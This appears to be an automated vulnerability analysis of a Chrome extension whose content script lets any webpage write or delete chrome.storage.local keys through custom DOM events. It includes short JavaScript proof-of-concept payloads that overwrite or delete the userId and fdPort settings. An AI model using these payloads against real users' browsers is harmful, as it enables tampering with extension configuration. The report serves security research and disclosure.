# CoCo Analysis: phgddhgfnjjaobkeekohieahfingldac

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: document_eventListener_fdWebExtension.saveToStorage → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/tmp/EOPG/result_analyze/opgen_results/server/all/detected/phgddhgfnjjaobkeekohieahfingldac/opgen_generated_files/cs_0.js
Line 582  document.addEventListener('fdWebExtension.saveToStorage', e => {
          e
Line 583  var key = e.detail.key;
          e.detail
Line 584  var value = e.detail.value;
          e.detail.value
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `<all_urls>` (extension runs on all websites per manifest.json)

**Attack Vector:** DOM events - any webpage can dispatch custom events

**Code:**

```javascript
// Content script (cs_0.js line 582)
document.addEventListener('fdWebExtension.saveToStorage', e => {
  var key = e.detail.key; // ← attacker-controlled
  var value = e.detail.value; // ← attacker-controlled
  chrome.storage.local.set({ [key]: value }); // ← writes to storage
});
```

**Attack:**

```javascript
// Malicious code on ANY webpage
var event = new CustomEvent('fdWebExtension.saveToStorage', {
  detail: {
    key: 'fdWebExtension.userId',
    value: 'attacker-controlled-id'
  }
});
document.dispatchEvent(event);

// Or pollute critical settings
var event2 = new CustomEvent('fdWebExtension.saveToStorage', {
  detail: {
    key: 'fdWebExtension.fdPort',
    value: '9999' // Change port to attacker-controlled server
  }
});
document.dispatchEvent(event2);
```

**Impact:** Complete storage exploitation - attacker can write arbitrary key-value pairs to chrome.storage.local from any webpage. This can:
1. Corrupt extension configuration (override fdPort, userId)
2. Inject malicious data that the extension may later retrieve and use
3. Overwrite legitimate user data
4. Potentially lead to further exploitation if stored values are used in privileged contexts

---

## Sink 2: document_eventListener_fdWebExtension.deleteFromStorage → chrome_storage_local_remove_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/tmp/EOPG/result_analyze/opgen_results/server/all/detected/phgddhgfnjjaobkeekohieahfingldac/opgen_generated_files/cs_0.js
Line 589  document.addEventListener('fdWebExtension.deleteFromStorage', e => {
          e
Line 590  var key = e.detail.key;
          e.detail
Line 590  var key = e.detail.key;
          e.detail.key
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `<all_urls>` (extension runs on all websites per manifest.json)

**Attack Vector:** DOM events - any webpage can dispatch custom events

**Code:**

```javascript
// Content script (cs_0.js line 589)
document.addEventListener('fdWebExtension.deleteFromStorage', e => {
  var key = e.detail.key; // ← attacker-controlled
  chrome.storage.local.remove(key, () => { // ← removes from storage
    if (chrome.runtime.lastError) {
      console.error(chrome.runtime.lastError.message);
    }
  });
});
```

**Attack:**

```javascript
// Malicious code on ANY webpage
// Delete user's saved settings
var event = new CustomEvent('fdWebExtension.deleteFromStorage', {
  detail: {
    key: 'fdWebExtension.userId'
  }
});
document.dispatchEvent(event);

// Delete port configuration
var event2 = new CustomEvent('fdWebExtension.deleteFromStorage', {
  detail: {
    key: 'fdWebExtension.fdPort'
  }
});
document.dispatchEvent(event2);
```

**Impact:** Storage deletion vulnerability - attacker can delete any key from chrome.storage.local from any webpage. This enables:
1. Denial of service by deleting critical extension configuration
2. Forcing extension to use default/fallback values that may be less secure
3. Disrupting extension functionality
4. Deleting user preferences and saved data

---

## Overall Summary

**True Positives: 2 vulnerabilities**

The extension has severe vulnerabilities in its content script that allow ANY webpage to:
1. Write arbitrary data to chrome.storage.local (complete storage write control)
2. Delete any key from chrome.storage.local (storage DoS)

These vulnerabilities exist because:
- The extension uses DOM event listeners for cross-context communication
- It trusts all events without origin validation
- The extension runs on ALL websites (`<all_urls>`)
- Any webpage can dispatch these custom events

The impact is particularly severe because:
- Looking at the code, the extension stores `fdWebExtension.userId` and `fdWebExtension.fdPort` which appear to be used for connecting to a local server
- An attacker can override the port to redirect connections to their own server
- An attacker can inject a malicious userId
- An attacker can delete critical configuration causing the extension to malfunction

This is a complete storage exploitation chain: attacker-controlled input → storage.set/remove → no retrieval needed as the stored values directly affect extension behavior.
